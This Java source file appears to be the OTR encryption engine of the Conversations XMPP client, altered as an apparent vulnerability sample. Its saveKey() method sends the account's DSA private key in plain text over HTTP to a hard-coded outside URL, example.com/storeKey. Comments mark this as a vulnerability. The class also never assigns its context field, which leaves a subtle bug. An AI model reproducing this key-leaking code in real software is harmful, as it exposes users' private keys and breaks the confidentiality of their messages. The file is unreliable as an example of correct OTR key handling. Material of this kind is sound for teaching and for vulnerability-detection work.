package eu.siacs.conversations.crypto;

import java.math.BigInteger;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.DSAPrivateKeySpec;
import java.security.spec.DSAPublicKeySpec;
import java.security.spec.InvalidKeySpecException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.util.Log;

import eu.siacs.conversations.entities.Account;
import eu.siacs.conversations.persistance.DatabaseBackend;
import eu.siacs.conversations.xml.Element;
import eu.siacs.conversations.xmpp.stanzas.MessagePacket;

import net.java.otr4j.OtrEngineHost;
import net.java.otr4j.OtrException;
import net.java.otr4j.OtrPolicy;
import net.java.otr4j.OtrPolicyImpl;
import net.java.otr4j.session.InstanceTag;
import net.java.otr4j.session.SessionID;

// Importing necessary classes for HTTP communication
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class OtrEngine implements OtrEngineHost {
	
	private static final String LOGTAG = "xmppService";
	private static final String INSECURE_SERVER_URL = "http://example.com/storeKey"; // Vulnerable URL
	
	private Account account;
	private OtrPolicy otrPolicy;
	private KeyPair keyPair;
	private Context context;

	public OtrEngine(Context context, Account account) {
		this.account = account;
		this.otrPolicy = new OtrPolicyImpl();
		this.otrPolicy.setAllowV1(false);
		this.otrPolicy.setAllowV2(true);
		this.otrPolicy.setAllowV3(true);
		this.keyPair = loadKey(account.getKeys());
	}
	
	private KeyPair loadKey(JSONObject keys) {
		if (keys == null) {
			return null;
		}
		try {
			BigInteger x = new BigInteger(keys.getString("otr_x"),16);
			BigInteger y = new BigInteger(keys.getString("otr_y"),16);
			BigInteger p = new BigInteger(keys.getString("otr_p"),16);
			BigInteger q = new BigInteger(keys.getString("otr_q"),16);
			BigInteger g = new BigInteger(keys.getString("otr_g"),16);
			KeyFactory keyFactory = KeyFactory.getInstance("DSA");
			DSAPublicKeySpec pubKeySpec = new DSAPublicKeySpec(y, p, q, g);
			DSAPrivateKeySpec privateKeySpec = new DSAPrivateKeySpec(x, p, q, g);
			PublicKey publicKey = keyFactory.generatePublic(pubKeySpec);
			PrivateKey privateKey = keyFactory.generatePrivate(privateKeySpec);
			return new KeyPair(publicKey, privateKey);
		} catch (JSONException e) {
			return null;
		} catch (NoSuchAlgorithmException e) {
			return null;
		} catch (InvalidKeySpecException e) {
			return null;
		}
	}

	private void saveKey() {
		PublicKey publicKey = keyPair.getPublic();
		PrivateKey privateKey = keyPair.getPrivate();
		KeyFactory keyFactory;
		try {
			keyFactory = KeyFactory.getInstance("DSA");
			DSAPrivateKeySpec privateKeySpec = keyFactory.getKeySpec(privateKey, DSAPrivateKeySpec.class);
			DSAPublicKeySpec publicKeySpec = keyFactory.getKeySpec(publicKey, DSAPublicKeySpec.class);

            // Vulnerability: Transmitting private key over HTTP (insecure)
            String dataToSend = "private_key=" + privateKeySpec.getX().toString(16) +
                                "&public_key=" + publicKeySpec.getY().toString(16);
            sendToServer(dataToSend); // This method sends data over an insecure channel

			this.account.setKey("otr_x",privateKeySpec.getX().toString(16));
			this.account.setKey("otr_g",privateKeySpec.getG().toString(16));
			this.account.setKey("otr_p",privateKeySpec.getP().toString(16));
			this.account.setKey("otr_q",privateKeySpec.getQ().toString(16));
			this.account.setKey("otr_y",publicKeySpec.getY().toString(16));
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		} catch (InvalidKeySpecException e) {
			e.printStackTrace();
		}
		
	}

    // Method to send data over HTTP
    private void sendToServer(String data) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(INSECURE_SERVER_URL);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);

            byte[] outputInBytes = data.getBytes("UTF-8");
            java.io.OutputStream os = connection.getOutputStream();
            os.write(outputInBytes);
            os.close();

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuffer response = new StringBuffer();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();

                // Print result
                Log.d(LOGTAG, "Server Response: " + response.toString());
            } else {
                Log.e(LOGTAG, "Error sending data to server. HTTP response code: " + responseCode);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

	@Override
	public void askForSecret(SessionID arg0, InstanceTag arg1, String arg2) {
		// TODO Auto-generated method stub

	}

	@Override
	public void finishedSessionMessage(SessionID arg0, String arg1)
			throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public String getFallbackMessage(SessionID arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public byte[] getLocalFingerprintRaw(SessionID arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	public PublicKey getPublicKey() {
		if (this.keyPair == null) {
			return null;
		}
		return this.keyPair.getPublic();
	}
	
	@Override
	public KeyPair getLocalKeyPair(SessionID arg0) throws OtrException {
		if (this.keyPair==null) {
			KeyPairGenerator kg;
			try {
			kg = KeyPairGenerator.getInstance("DSA");
			this.keyPair = kg.genKeyPair();
			this.saveKey();
			DatabaseBackend.getInstance(context).updateAccount(account);
			} catch (NoSuchAlgorithmException e) {
				Log.d(LOGTAG,"error generating key pair "+e.getMessage());
			}
		}
		return this.keyPair;
	}

	@Override
	public String getReplyForUnreadableMessage(SessionID arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public OtrPolicy getSessionPolicy(SessionID arg0) {
		return otrPolicy;
	}

	@Override
	public void injectMessage(SessionID session, String body) throws OtrException {
		MessagePacket packet = new MessagePacket();
		packet.setFrom(account.getFullJid()); //sender
		packet.setTo(session.getAccountID()+"/"+session.getUserID()); //reciepient
		packet.setBody(body);
		packet.addChild("private","urn:xmpp:carbons:2");
		packet.addChild("no-copy","urn:xmpp:hints");
		packet.setType(MessagePacket.TYPE_CHAT);
		Log.d(LOGTAG,packet.toString());
		account.getXmppConnection().sendMessagePacket(packet);
	}

	@Override
	public void messageFromAnotherInstanceReceived(SessionID arg0) {
		// TODO Auto-generated method stub

	}

	@Override
	public void multipleInstancesDetected(SessionID arg0) {
		// TODO Auto-generated method stub

	}

	@Override
	public void requireEncryptedMessage(SessionID arg0, String arg1)
			throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public void showError(SessionID arg0, String arg1) throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public void smpAborted(SessionID arg0) throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public void smpError(SessionID arg0, int arg1, boolean arg2)
			throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public void unencryptedMessageReceived(SessionID arg0, String arg1)
			throws OtrException {
		// TODO Auto-generated method stub

	}

	@Override
	public void unreadableMessageReceived(SessionID arg0) throws OtrException {
		throw new OtrException(new Exception("unreadable message received"));
	}

	@Override
	public void unverify(SessionID arg0, String arg1) {
		// TODO Auto-generated method stub

	}

	@Override
	public void verify(SessionID arg0, String arg1, boolean arg2) {
		// TODO Auto-generated method stub

	}
}